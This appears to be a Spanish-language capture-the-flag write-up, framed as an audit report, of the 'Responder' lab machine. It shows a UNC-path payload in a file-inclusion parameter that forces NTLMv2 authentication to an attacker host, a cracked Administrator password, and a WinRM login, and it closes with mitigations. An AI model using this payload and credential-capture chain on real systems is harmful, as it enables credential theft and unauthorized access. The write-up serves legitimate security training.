Informe de Auditoría de Seguridad: Máquina "Responder"

Fecha: 21 de abril de 2026

Severidad: Crítica

Objetivo: 10.129.95.234 (unika.htb)
1. Resumen Ejecutivo

Se ha realizado una prueba de penetración en la máquina "Responder", logrando acceso completo al sistema con privilegios de Administrador. La vulnerabilidad principal reside en una implementación insegura de la función de inclusión de archivos en el servicio web, permitiendo la captura y posterior crackeo de credenciales NTLMv2.
2. Fase de Reconocimiento (Enumeración)

El escaneo de puertos reveló servicios críticos abiertos:

    80 (HTTP): Servidor Apache ejecutando PHP 8.1.1.

    5985 (WinRM): Gestión remota de Windows activa.

Se identificó el dominio unika.htb y el parámetro vulnerable page en la URL: http://unika.htb/index.php?page=.
3. Explotación (Vectores de Ataque)
3.1 Captura de Hash NTLMv2

Se utilizó un ataque de Inyección de Ruta UNC mediante el parámetro page. Al proporcionar una dirección IP controlada por el atacante, el servidor intentó autenticarse automáticamente.

    Herramienta: Responder

    Comando: sudo responder -I tun0

    Carga útil (Payload): http://unika.htb/index.php?page=//10.10.14.151/test

3.2 Crackeo de Contraseña

El hash capturado del usuario Administrator fue procesado mediante un ataque de diccionario.

    Herramienta: John the Ripper

    Diccionario: rockyou.txt

    Resultado: badminton

4. Post-Explotación y Acceso

Con las credenciales obtenidas, se estableció una sesión remota a través del puerto 5985.

    Herramienta: Evil-WinRM

    Usuario: Administrator

    Flag recuperada: Ubicada en C:\Users\mike\Desktop\flag.txt mediante el comando Get-ChildItem.

5. Recomendaciones de Mitigación

    Saneamiento de Entradas: Filtrar el parámetro page para evitar que acepte rutas que comiencen por // o \\ (bloqueo de rutas UNC).

    Configuración de Red: Deshabilitar los protocolos de resolución de nombres heredados (LLMNR/NBT-NS) si no son necesarios.

    Seguridad de Cuentas: Implementar políticas de contraseñas robustas que no figuren en diccionarios comunes.

    Acceso Remoto: Restringir el acceso al puerto 5985 (WinRM) solo a IPs de administración autorizadas.
